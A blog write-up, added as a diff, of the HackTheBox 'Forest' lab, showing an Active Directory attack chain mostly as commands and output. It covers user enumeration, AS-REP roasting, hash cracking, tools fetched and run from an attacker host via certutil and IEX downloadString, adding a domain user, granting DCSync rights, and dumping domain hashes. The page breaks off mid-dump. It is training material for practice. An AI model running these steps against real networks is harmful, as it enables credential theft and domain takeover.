@@ -1,0 +1,543 @@
+<!DOCTYPE html>
+<html lang="en-US">
+  <head>
+    <meta charset='utf-8'>
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <link rel="stylesheet" href="/assets/css/style.css?v=">
+    <link rel="stylesheet" type="text/css" href="/assets/css/print.css" media="print">
+    <!--[if lt IE 9]>
+    <script src="//html5shiv.googlecode.com/svn/trunk/html5.js"></script>
+    <![endif]-->
+
+<!-- Begin Jekyll SEO tag v2.8.0 -->
+<title>Forest | Gerardo’s Blog</title>
+<meta name="generator" content="Jekyll v4.3.2" />
+<meta property="og:title" content="Forest" />
+<meta property="og:locale" content="en_US" />
+<meta name="description" content="Overview HackTheBox Forest is a great for learning how to exploit a Windows Active Directory machine. I definitely struggled with completing this box since I am relatively new to HackTheBox, but overall I enjoyed the process of enumerating the machine to gain access to a service account user then privilege escalating to the administrator account." />
+<meta property="og:description" content="Overview HackTheBox Forest is a great for learning how to exploit a Windows Active Directory machine. I definitely struggled with completing this box since I am relatively new to HackTheBox, but overall I enjoyed the process of enumerating the machine to gain access to a service account user then privilege escalating to the administrator account." />
+<link rel="canonical" href="http://localhost:4000/Forest/" />
+<meta property="og:url" content="http://localhost:4000/Forest/" />
+<meta property="og:site_name" content="Gerardo’s Blog" />
+<meta property="og:type" content="article" />
+<meta property="article:published_time" content="2023-12-02T00:00:00-08:00" />
+<meta name="twitter:card" content="summary" />
+<meta property="twitter:title" content="Forest" />
+<script type="application/ld+json">
+{"@context":"https://schema.org","@type":"BlogPosting","dateModified":"2023-12-02T00:00:00-08:00","datePublished":"2023-12-02T00:00:00-08:00","description":"Overview HackTheBox Forest is a great for learning how to exploit a Windows Active Directory machine. I definitely struggled with completing this box since I am relatively new to HackTheBox, but overall I enjoyed the process of enumerating the machine to gain access to a service account user then privilege escalating to the administrator account.","headline":"Forest","mainEntityOfPage":{"@type":"WebPage","@id":"http://localhost:4000/Forest/"},"url":"http://localhost:4000/Forest/"}</script>
+<!-- End Jekyll SEO tag -->
+
+    <!-- start custom head snippets, customize with your own _includes/head-custom.html file -->
+
+<!-- Setup Google Analytics -->
+
+
+
+<!-- You can set your favicon here -->
+<!-- link rel="shortcut icon" type="image/x-icon" href="/favicon.ico" -->
+
+<!-- end custom head snippets -->
+
+  </head>
+
+  <body>
+    <div id="container">
+      <div class="inner">
+
+        <header>
+          <h1>Forest</h1>
+          <h2></h2>
+        </header>
+        <hr>
+        <section id="main_content">
+          <h1 id="overview">Overview</h1>
+<p>HackTheBox Forest is a great for learning how to exploit a Windows Active Directory machine. I definitely struggled with completing this box since I am relatively new to HackTheBox, but overall I enjoyed the process of enumerating the machine to gain access to a service account user then privilege escalating to the administrator account.</p>
+
+<ul>
+  <li>
+    <p>nmap scan:</p>
+
+    <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>  nmap <span class="nt">-p-</span> <span class="nt">-sVC</span> <span class="nt">-A</span> <span class="nt">-T4</span> 10.10.10.161 <span class="nt">-oN</span> forestScan 
+</code></pre></div>    </div>
+
+    <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>  ➜  ~ <span class="nb">cat </span>forestScan                                                                                          
+  <span class="c"># Nmap 7.94SVN scan initiated Sun Apr 28 03:08:54 2024 as: nmap -p- -T4 -sCV -A -oN forestScan 10.10.10.161  </span>
+  Nmap scan report <span class="k">for </span>10.10.10.161                                                                            
+  Host is up <span class="o">(</span>0.085s latency<span class="o">)</span><span class="nb">.</span>                                                                                 
+  Not shown: 65512 closed tcp ports <span class="o">(</span>conn-refused<span class="o">)</span>                                                             
+  PORT      STATE SERVICE      VERSION                                                                         
+  88/tcp    open  kerberos-sec Microsoft Windows Kerberos <span class="o">(</span>server <span class="nb">time</span>: 2024-04-28 10:16:42Z<span class="o">)</span>                  
+  135/tcp   open  msrpc        Microsoft Windows RPC                                                           
+  139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn                                                   
+  389/tcp   open  ldap         Microsoft Windows Active Directory LDAP <span class="o">(</span>Domain: htb.local, Site: Default-First-
+  Site-Name<span class="o">)</span>                                                                                                   
+  445/tcp   open  microsoft-ds Windows Server 2016 Standard 14393 microsoft-ds <span class="o">(</span>workgroup: HTB<span class="o">)</span>                
+  464/tcp   open  kpasswd5?                                                                                    
+  593/tcp   open  ncacn_http   Microsoft Windows RPC over HTTP 1.0                                             
+  636/tcp   open  tcpwrapped                                                                                   
+  3268/tcp  open  ldap         Microsoft Windows Active Directory LDAP <span class="o">(</span>Domain: htb.local, Site: Default-First-
+  Site-Name<span class="o">)</span>                                                                                                   
+  3269/tcp  open  tcpwrapped                                                                                   
+  5985/tcp  open  http         Microsoft HTTPAPI httpd 2.0 <span class="o">(</span>SSDP/UPnP<span class="o">)</span>                                         
+  |_http-server-header: Microsoft-HTTPAPI/2.0                                                                  
+  |_http-title: Not Found                                                                                      
+  9389/tcp  open  mc-nmf       .NET Message Framing                                                            
+  47001/tcp open  http         Microsoft HTTPAPI httpd 2.0 <span class="o">(</span>SSDP/UPnP<span class="o">)</span>
+  |_http-title: Not Found
+  |_http-server-header: Microsoft-HTTPAPI/2.0
+  49664/tcp open  msrpc        Microsoft Windows RPC
+  49665/tcp open  msrpc        Microsoft Windows RPC
+  <span class="o">[</span>0] 0:sudo- 1:[tmux]<span class="k">*</span>                                                                  <span class="s2">"kali"</span> 03:39 28-Apr-24
+  49666/tcp open  msrpc        Microsoft Windows RPC
+  49667/tcp open  msrpc        Microsoft Windows RPC
+  49671/tcp open  msrpc        Microsoft Windows RPC
+  49676/tcp open  ncacn_http   Microsoft Windows RPC over HTTP 1.0
+  49677/tcp open  msrpc        Microsoft Windows RPC
+  49682/tcp open  msrpc        Microsoft Windows RPC
+  49701/tcp open  msrpc        Microsoft Windows RPC
+  49973/tcp open  msrpc        Microsoft Windows RPC
+  Service Info: Host: FOREST<span class="p">;</span> OS: Windows<span class="p">;</span> CPE: cpe:/o:microsoft:windows
+    
+  Host script results:
+  |_clock-skew: mean: 2h26m48s, deviation: 4h02m30s, median: 6m47s
+  | smb-security-mode: 
+  |   account_used: guest
+  |   authentication_level: user
+  |   challenge_response: supported
+  |_  message_signing: required
+  | smb2-time: 
+  |   <span class="nb">date</span>: 2024-04-28T10:17:35
+  |_  start_date: 2024-04-27T18:52:32
+  | smb2-security-mode: 
+  |   3:1:1: 
+  |_    Message signing enabled and required
+  | smb-os-discovery: 
+  |   OS: Windows Server 2016 Standard 14393 <span class="o">(</span>Windows Server 2016 Standard 6.3<span class="o">)</span>
+  |   Computer name: FOREST
+  |   NetBIOS computer name: FOREST<span class="se">\x</span>00
+  |   Domain name: htb.local
+  |   Forest name: htb.local
+  |   FQDN: FOREST.htb.local
+  |_  System <span class="nb">time</span>: 2024-04-28T03:17:33-07:00
+    
+  Service detection performed. Please report any incorrect results at https://nmap.org/submit/ <span class="nb">.</span>
+  <span class="c"># Nmap done at Sun Apr 28 03:10:56 2024 -- 1 IP address (1 host up) scanned in 122.36 seconds</span>
+    
+</code></pre></div>    </div>
+  </li>
+  <li>Another method to get domain users using rpcclient:
+    <ul>
+      <li>
+        <p>The <strong>rpcclient</strong> was designed to perform debugging and troubleshooting tasks on a Windows Samba configuration</p>
+
+        <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>  ➜  ~ rpcclient <span class="nt">-U</span> <span class="s1">''</span> <span class="nt">-N</span> 10.10.10.161 
+  rpcclient <span class="nv">$&gt;</span> enumdomusers
+  user:[Administrator] rid:[0x1f4]
+  user:[Guest] rid:[0x1f5]
+  user:[krbtgt] rid:[0x1f6]
+  user:[DefaultAccount] rid:[0x1f7]
+  user:[<span class="nv">$331000</span><span class="nt">-VK4ADACQNUCA</span><span class="o">]</span> rid:[0x463]
+  user:[SM_2c8eef0a09b545acb] rid:[0x464]
+  user:[SM_ca8c2ed5bdab4dc9b] rid:[0x465]
+  user:[SM_75a538d3025e4db9a] rid:[0x466]
+  user:[SM_681f53d4942840e18] rid:[0x467]
+  user:[SM_1b41c9286325456bb] rid:[0x468]
+  user:[SM_9b69f1b9d2cc45549] rid:[0x469]
+  user:[SM_7c96b981967141ebb] rid:[0x46a]
+  user:[SM_c75ee099d0a64c91b] rid:[0x46b]
+  user:[SM_1ffab36a2f5f479cb] rid:[0x46c]
+  user:[HealthMailboxc3d7722] rid:[0x46e]
+  user:[HealthMailboxfc9daad] rid:[0x46f]
+  user:[HealthMailboxc0a90c9] rid:[0x470]
+  user:[HealthMailbox670628e] rid:[0x471]
+  user:[HealthMailbox968e74d] rid:[0x472]
+  user:[HealthMailbox6ded678] rid:[0x473]
+  user:[HealthMailbox83d6781] rid:[0x474]
+  user:[HealthMailboxfd87238] rid:[0x475]
+  user:[HealthMailboxb01ac64] rid:[0x476]
+  user:[HealthMailbox7108a4e] rid:[0x477]
+  user:[HealthMailbox0659cc1] rid:[0x478]
+  user:[sebastien] rid:[0x479]
+  user:[lucinda] rid:[0x47a]
+  user:[svc-alfresco] rid:[0x47b]
+  user:[andy] rid:[0x47e]
+  user:[mark] rid:[0x47f]
+  user:[santi] rid:[0x480]
+</code></pre></div>        </div>
+      </li>
+    </ul>
+  </li>
+  <li>
+    <p>Users:</p>
+
+    <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>  enum4linux <span class="nt">-a</span> <span class="nt">-u</span> <span class="s2">""</span> <span class="nt">-p</span> <span class="s2">""</span> 10.10.10.161 <span class="o">&amp;&amp;</span> enum4linux <span class="nt">-a</span> <span class="nt">-u</span> <span class="s2">"guest"</span> <span class="nt">-p</span> <span class="s2">""</span> 10.10.10.161
+</code></pre></div>    </div>
+
+    <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>  user:[Administrator] rid:[0x1f4]                                                                           
+  user:[Guest] rid:[0x1f5]                                                                                   
+  user:[krbtgt] rid:[0x1f6]                                                                                  
+  user:[DefaultAccount] rid:[0x1f7]                                                                          
+  user:[<span class="nv">$331000</span><span class="nt">-VK4ADACQNUCA</span><span class="o">]</span> rid:[0x463]                                                                    
+  user:[SM_2c8eef0a09b545acb] rid:[0x464]                                                                    
+  user:[SM_ca8c2ed5bdab4dc9b] rid:[0x465]                                                                    
+  user:[SM_75a538d3025e4db9a] rid:[0x466]                                                                    
+  user:[SM_681f53d4942840e18] rid:[0x467]                                                                    
+  user:[SM_1b41c9286325456bb] rid:[0x468]                                                                    
+  user:[SM_9b69f1b9d2cc45549] rid:[0x469]                                                                    
+  user:[SM_7c96b981967141ebb] rid:[0x46a]                                                                    
+  user:[SM_c75ee099d0a64c91b] rid:[0x46b]                                                                    
+  user:[SM_1ffab36a2f5f479cb] rid:[0x46c]                                                                    
+  user:[HealthMailboxc3d7722] rid:[0x46e]                                                                    
+  user:[HealthMailboxfc9daad] rid:[0x46f]                                                                    
+  user:[HealthMailboxc0a90c9] rid:[0x470]                                                                    
+  user:[HealthMailbox670628e] rid:[0x471]                                                                    
+  user:[HealthMailbox968e74d] rid:[0x472]                                                                    
+  user:[HealthMailbox6ded678] rid:[0x473]                                                                    
+  user:[HealthMailbox83d6781] rid:[0x474]                                                                    
+  user:[HealthMailboxfd87238] rid:[0x475]                                                                    
+  user:[HealthMailboxb01ac64] rid:[0x476]                                                                    
+  user:[HealthMailbox7108a4e] rid:[0x477]                                                                    
+  user:[HealthMailbox0659cc1] rid:[0x478]                                                                  
+  user:[sebastien] rid:[0x479]                                                                             
+  user:[lucinda] rid:[0x47a]                                                                               
+  user:[svc-alfresco] rid:[0x47b]                                                                          
+  user:[andy] rid:[0x47e]
+  user:[mark] rid:[0x47f]    
+  user:[santi] rid:[0x480]
+</code></pre></div>    </div>
+  </li>
+  <li>
+    <p>svc_alfresco is a service user, we can confirm using rpcclient</p>
+
+    <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>  rpcclient <span class="nv">$&gt;</span> queryusergroups 0x47b
+          group rid:[0x201] attr:[0x7]
+          group rid:[0x47c] attr:[0x7]
+  rpcclient <span class="nv">$&gt;</span> querygroup 0x201
+          Group Name:     Domain Users
+          Description:    All domain <span class="nb">users
+          </span>Group Attribute:7
+          Num Members:30
+  rpcclient <span class="nv">$&gt;</span> querygroup 0x47c
+          Group Name:     Service Accounts
+          Description:
+          Group Attribute:7
+          Num Members:1
+</code></pre></div>    </div>
+  </li>
+  <li>
+    <p>Formatting users file:</p>
+
+    <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>  ➜  ~ <span class="nb">awk</span> <span class="s1">'{ gsub(/user:\[|\]/, ""); print $1}'</span> users.txt <span class="o">&gt;</span> forestUsers.txt
+</code></pre></div>    </div>
+  </li>
+  <li>
+    <p>GetNPUsers (didn’t work):</p>
+
+    <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>  ➜  ~ <span class="nb">sudo </span>python3 GetNPUsers.py forest.htb.local/ <span class="nt">-usersfile</span> forestUsers.txt <span class="nt">-format</span> hashcat <span class="nt">-outputfile</span> hashes.asreproast
+</code></pre></div>    </div>
+  </li>
+  <li>
+    <p>We will be using <strong><em>GetNPUsers.py</em></strong>. What this does is it gets all the users that don’t require a Keberos pre-authentication and we can extract their TGTs.</p>
+
+    <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>  ➜  ~ python3 GetNPUsers.py <span class="nt">-dc-ip</span> 10.10.10.161 <span class="nt">-request</span> <span class="s1">'htb.local/'</span> <span class="nt">-format</span> hashcat 
+  Impacket v0.11.0 - Copyright 2023 Fortra
+    
+  Name          MemberOf                                                PasswordLastSet             LastLogon                   UAC      
+  <span class="nt">------------</span>  <span class="nt">------------------------------------------------------</span>  <span class="nt">--------------------------</span>  <span class="nt">--------------------------</span>  <span class="nt">--------</span>
+  svc-alfresco  <span class="nv">CN</span><span class="o">=</span>Service Accounts,OU<span class="o">=</span>Security Groups,DC<span class="o">=</span>htb,DC<span class="o">=</span><span class="nb">local  </span>2024-04-28 04:56:22.631863  2019-09-23 04:09:47.931194  0x410200 
+    
+  <span class="nv">$krb5asrep$23$svc</span><span class="nt">-alfresco</span>@HTB.LOCAL:f273a60f1819563f3e88f5d0d4f45f12<span class="nv">$64aa84f3c73959c071355f21de049ed753278f551e6569cfb4eeaf407d07262c300fda114790d9a2a7b55f306afbff454ac7bbd5f550cff7d66f746df692c968e72605c0d010a92d1e719218f8e50af6b966f7aaf411e2a2780e51b461248f205acee7739df180d2938d6b7222ad9b48f8e71c78f64f344ef8f3a4c6e16ef8f89d386ee04f311ea7dcdb31dba2292b42ea8796bfaa5602383f746a9624b2ce6a24ea86924f965d00bf89705e9144af6abcef09d51b142dcc55b496dd12b4b68cdc8c44c3ff0e8d9f3babee6948a34ad9da8ae48642b928819408f6fab7f6ec4a7834e69b3515</span>
+  ➜  ~ nano svc_alfrescoHash
+    
+</code></pre></div>    </div>
+  </li>
+  <li>
+    <p>Cracking svc-alfresco’s password:</p>
+
+    <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>  ➜  ~ john svc_alfrescoHash <span class="nt">--wordlist</span><span class="o">=</span>/usr/share/wordlists/rockyou.txt 
+  Using default input encoding: UTF-8
+  Loaded 1 password <span class="nb">hash</span> <span class="o">(</span>krb5asrep, Kerberos 5 AS-REP etype 17/18/23 <span class="o">[</span>MD4 HMAC-MD5 RC4 / PBKDF2 HMAC-SHA1 AES 256/256 AVX2 8x]<span class="o">)</span>
+  Will run 4 OpenMP threads
+  Press <span class="s1">'q'</span> or Ctrl-C to abort, almost any other key <span class="k">for </span>status
+  s3rvice          <span class="o">(</span><span class="nv">$krb5asrep$23$svc</span><span class="nt">-alfresco</span>@HTB.LOCAL<span class="o">)</span>     
+  1g 0:00:00:02 DONE <span class="o">(</span>2024-04-28 04:51<span class="o">)</span> 0.3787g/s 1547Kp/s 1547Kc/s 1547KC/s s4553592..s3r2s1
+  Use the <span class="s2">"--show"</span> option to display all of the cracked passwords reliably
+  Session completed.
+</code></pre></div>    </div>
+  </li>
+  <li>
+    <p>evil-winrm:</p>
+
+    <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>  ➜  ~ evil-winrm <span class="nt">-i</span> 10.10.10.161 <span class="nt">-u</span> svc-alfresco <span class="nt">-p</span> s3rvice
+                                            
+  Evil-WinRM shell v3.5
+                                            
+  Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc<span class="o">()</span> <span class="k">function </span>is unimplemented on this machine
+                                            
+  Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
+                                            
+  Info: Establishing connection to remote endpoint
+  <span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\U</span>sers<span class="se">\s</span>vc-alfresco<span class="se">\D</span>ocuments&gt;
+</code></pre></div>    </div>
+  </li>
+  <li>
+    <p>Check current users privileges (Windows):</p>
+
+    <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>  <span class="nb">whoami</span> /priv
+  <span class="nb">whoami</span> /all
+</code></pre></div>    </div>
+  </li>
+  <li>
+    <p>Transferring files to Windows:</p>
+
+    <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>  <span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\U</span>sers<span class="se">\s</span>vc-alfresco<span class="se">\D</span>ocuments&gt; certutil <span class="nt">-urlcache</span> <span class="nt">-f</span> http://10.10.14.34:8000/SharpHound.exe
+   SharpHound.exe
+  <span class="k">****</span>  Online  <span class="k">****</span>
+  CertUtil: <span class="nt">-URLCache</span> <span class="nb">command </span>completed successfully.
+</code></pre></div>    </div>
+  </li>
+  <li>
+    <p>Creating smbserver to transfer files from Windows to Kali (vice versa):</p>
+
+    <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>  // Kali
+  ➜  ~ impacket-smbserver icarus <span class="nb">.</span>
+  Impacket v0.11.0 - Copyright 2023 Fortra
+    
+  <span class="o">[</span><span class="k">*</span><span class="o">]</span> Config file parsed
+  <span class="o">[</span><span class="k">*</span><span class="o">]</span> Callback added <span class="k">for </span>UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
+  <span class="o">[</span><span class="k">*</span><span class="o">]</span> Callback added <span class="k">for </span>UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
+  <span class="o">[</span><span class="k">*</span><span class="o">]</span> Config file parsed
+  <span class="o">[</span><span class="k">*</span><span class="o">]</span> Config file parsed
+  <span class="o">[</span><span class="k">*</span><span class="o">]</span> Config file parsed
+  <span class="o">[</span><span class="k">*</span><span class="o">]</span> Incoming connection <span class="o">(</span>10.10.10.161,58759<span class="o">)</span>
+  <span class="o">[</span><span class="k">*</span><span class="o">]</span> AUTHENTICATE_MESSAGE <span class="o">(</span><span class="se">\,</span>FOREST<span class="o">)</span>
+  <span class="o">[</span><span class="k">*</span><span class="o">]</span> User FOREST<span class="se">\ </span>authenticated successfully
+  <span class="o">[</span><span class="k">*</span><span class="o">]</span> :::00::aaaaaaaaaaaaaaaa
+  <span class="o">[</span><span class="k">*</span><span class="o">]</span> Disconnecting Share<span class="o">(</span>1:IPC<span class="nv">$)</span>
+    
+</code></pre></div>    </div>
+
+    <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>  <span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\U</span>sers<span class="se">\s</span>vc-alfresco<span class="se">\D</span>ocuments&gt; net use <span class="se">\\</span>10.10.14.34<span class="se">\i</span>carus
+  The <span class="nb">command </span>completed successfully.
+</code></pre></div>    </div>
+
+    <ul>
+      <li>Copying files from Kali to Windows:</li>
+    </ul>
+
+    <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>  <span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\U</span>sers<span class="se">\s</span>vc-alfresco<span class="se">\D</span>ocuments&gt; copy <span class="se">\\</span>10.10.14.34<span class="se">\i</span>carus<span class="se">\u</span>sers.txt
+  <span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\U</span>sers<span class="se">\s</span>vc-alfresco<span class="se">\D</span>ocuments&gt; <span class="nb">dir
+    
+      </span>Directory: C:<span class="se">\U</span>sers<span class="se">\s</span>vc-alfresco<span class="se">\D</span>ocuments
+    
+  Mode                LastWriteTime         Length Name
+  <span class="nt">----</span>                <span class="nt">-------------</span>         <span class="nt">------</span> <span class="nt">----</span>
+  <span class="nt">-a----</span>        4/28/2024   5:17 AM          18941 20240428051704_BloodHound.zip
+  <span class="nt">-a----</span>        4/28/2024   5:17 AM          19538 MzZhZTZmYjktOTM4NS00NDQ3LTk3OGItMmEyYTVjZjNiYTYw.bin
+  <span class="nt">-a----</span>        4/28/2024   5:16 AM        1046528 SharpHound.exe
+  <span class="nt">-a----</span>        4/28/2024   4:09 AM           3093 users.txt
+</code></pre></div>    </div>
+
+    <ul>
+      <li>I don’t think we are able to copy from Windows to Kali</li>
+    </ul>
+  </li>
+  <li>
+    <p>We can also use:</p>
+
+    <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>  certutil <span class="nt">-urlcache</span> <span class="nt">-split</span> <span class="nt">-f</span> http://10.10.14.34/<span class="o">(</span>file<span class="o">)</span> 
+</code></pre></div>    </div>
+  </li>
+  <li>Using bloodhound:
+    <ul>
+      <li>Start server:</li>
+    </ul>
+
+    <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>  <span class="nb">sudo </span>neo4j console
+</code></pre></div>    </div>
+
+    <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>  bloodhound
+</code></pre></div>    </div>
+
+    <ul>
+      <li>Drop file within bloodhound GUI</li>
+    </ul>
+  </li>
+  <li>Next we try to privileges escalate
+    <ul>
+      <li>Transfer winPEAS to Windows using smb share or certutil we used earlier</li>
+      <li>Execute winPEAS</li>
+    </ul>
+  </li>
+  <li>Viewing bloodhound and the “Shortest Path on the Owned Principal”
+    <ul>
+      <li>svc-alfresco is a member of Service Accounts</li>
+      <li>Service Accounts is a member of Privileged IT Accounts</li>
+      <li>Privileged IT Accounts is a member of Account Operators</li>
+      <li>Account Operators is a member of Exchanged Windows Permissions</li>
+      <li>Exchange Windows Permissions has WriteDacl permissions on HTB.LOCAL
+        <ul>
+          <li>Write DACL, or <strong>Discretionary Access Control List</strong>, allows a source security principal to modify the permissions of a target object.</li>
+        </ul>
+      </li>
+    </ul>
+  </li>
+  <li>The Account Operators group grants limited account creation privileges to a user.
+    <ul>
+      <li>Members of this group can create and modify most types of accounts, including those of users, local groups, and global groups, and members can log in locally to domain controllers.</li>
+    </ul>
+  </li>
+  <li>
+    <p>Account Operator has DCSync rights on HTB.LOCAL</p>
+
+    <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>  DCSync is a process where domain controllers <span class="k">in </span>an Active Directory environment synchronize data among themselves to ensure all controllers have up-to-date and consistent information. This replication includes updates to user accounts, passwords, and group memberships, which are vital <span class="k">for </span>maintaining the security and integrity of the network across multiple servers.
+</code></pre></div>    </div>
+  </li>
+  <li>To abuse this we will create a new user first, in order to keep the current account safe, if we ever need it.</li>
+  <li>
+    <p>To create a user:</p>
+
+    <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>  net user soulis iterative77 /add /domain
+</code></pre></div>    </div>
+
+    <p><img src="/assets/img/HTB/Forest_addUser.png" alt="Adduser" /></p>
+  </li>
+  <li>
+    <p>Adding the user to the group of Exchange Windows Permissions</p>
+
+    <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>  net group <span class="s2">"Exchange Windows Permissions"</span> /add soulis
+</code></pre></div>    </div>
+  </li>
+  <li>We use PowerView.ps1 to abuse WriteDacl
+    <ul>
+      <li>We can transfer file from Kali using SMB or certutil or use:</li>
+    </ul>
+
+    <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>  <span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\U</span>sers<span class="se">\s</span>vc-alfresco<span class="se">\D</span>ocuments&gt; IEX<span class="o">(</span>New-Object Net.WebClient<span class="o">)</span>.downloadString<span class="o">(</span><span class="s1">'http://10.10.14.34:8000/PowerView.ps1'</span><span class="o">)</span>
+</code></pre></div>    </div>
+  </li>
+  <li>
+    <p>Then we create a credential object  for our passwords and credentials for the user soulis we created earlier:</p>
+
+    <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>  <span class="nv">$pass</span> <span class="o">=</span> convertto-securestring <span class="s1">'iterative77'</span> <span class="nt">-AsPlainText</span> <span class="nt">-Force</span>
+  <span class="nv">$cred</span> <span class="o">=</span> New-Object System.Management.Automation.PSCredential<span class="o">(</span><span class="s1">'HTB\soulis'</span>, <span class="nv">$pass</span><span class="o">)</span> 
+</code></pre></div>    </div>
+  </li>
+  <li>Then we run the following command to grant us DCSync rights on our account</li>
+  <li>
+    <p>We run the following for DCSync rights on the account:</p>
+
+    <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>  Add-DomainObjectAcl <span class="nt">-Credential</span> <span class="nv">$cred</span> <span class="nt">-TargetIdentity</span> <span class="s2">"DC=htb,DC=local"</span> <span class="nt">-PrincipalIdentity</span> soulis <span class="nt">-Rights</span> DCSync
+</code></pre></div>    </div>
+
+    <p><img src="/assets/img/HTB/Forest_changePerm.png" alt="changePerm" /></p>
+
+    <ul>
+      <li>I can’t spell</li>
+    </ul>
+  </li>
+  <li>
+    <p>Secretsdump.py is a script from the Impacket Python library that can remotely steal credentials from an adversary’s machine</p>
+
+    <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>  ➜  ~ impacket-secretsdump HTB/soulis:iterative77@10.10.10.161                                            
+  Impacket v0.11.0 - Copyright 2023 Fortra                                                                 
+                                                                                                             
+  <span class="o">[</span>-] RemoteOperations failed: DCERPC Runtime Error: code: 0x5 - rpc_s_access_denied                       
+  <span class="o">[</span><span class="k">*</span><span class="o">]</span> Dumping Domain Credentials <span class="o">(</span>domain<span class="se">\u</span><span class="nb">id</span>:rid:lmhash:nthash<span class="o">)</span>                                            
+  <span class="o">[</span><span class="k">*</span><span class="o">]</span> Using the DRSUAPI method to get NTDS.DIT secrets                                                     
+  htb.local<span class="se">\A</span>dministrator:500:aad3b435b51404eeaad3b435b51404ee:32693b11e6aa90eb43d32c72a07ceea6:::         
+  Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::                           
+  krbtgt:502:aad3b435b51404eeaad3b435b51404ee:819af826bb148e603acb0f33d17632f8:::                          
+  DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::                  
+  htb.local<span class="se">\$</span>331000-VK4ADACQNUCA:1123:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0::: 
+  htb.local<span class="se">\S</span>M_2c8eef0a09b545acb:1124:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0::: 
+  htb.local<span class="se">\S</span>M_ca8c2ed5bdab4dc9b:1125:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0::: 
+  htb.local<span class="se">\S</span>M_75a538d3025e4db9a:1126:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0::: 
+  htb.local<span class="se">\S</span>M_681f53d4942840e18:1127:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0::: 
+  htb.local<span class="se">\S</span>M_1b41c9286325456bb:1128:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0::: 
+  htb.local<span class="se">\S</span>M_9b69f1b9d2cc45549:1129:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0::: 
+  htb.local<span class="se">\S</span>M_7c96b981967141ebb:1130:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0::: 
+  htb.local<span class="se">\S</span>M_c75ee099d0a64c91b:1131:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0::: 
+  htb.local<span class="se">\S</span>M_1ffab36a2f5f479cb:1132:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0::: 
+  htb.local<span class="se">\H</span>ealthMailboxc3d7722:1134:aad3b435b51404eeaad3b435b51404ee:4761b9904a3d88c9c9341ed081b4ec6f::: 
+  htb.local<span class="se">\H</span>ealthMailboxfc9daad:1135:aad3b435b51404eeaad3b435b51404ee:5e89fd2c745d7de396a0152f0e130f44::: 
+  htb.local<span class="se">\H</span>ealthMailboxc0a90c9:1136:aad3b435b51404eeaad3b435b51404ee:3b4ca7bcda9485fa39616888b9d43f05::: 
+  htb.local<span class="se">\H</span>ealthMailbox670628e:1137:aad3b435b51404eeaad3b435b51404ee:e364467872c4b4d1aad555a9e62bc88a:::
+  htb.local<span class="se">\s</span>ebastien:aes256-cts-hmac-sha1-96:fa87efc1dcc0204efb0870cf5af01ddbb00aefed27a1bf80464e77566b543161
+  htb.local<span class="se">\s</span>ebastien:aes128-cts-hmac-sha1-96:18574c6ae9e20c558821179a107c943a
+  htb.local<span class="se">\s</span>ebastien:des-cbc-md5:702a3445e0d65b58
+  htb.local<span class="se">\l</span>ucinda:aes256-cts-hmac-sha1-96:acd2f13c2bf8c8fca7bf036e59c1f1fefb6d087dbb97ff0428ab0972011067d5
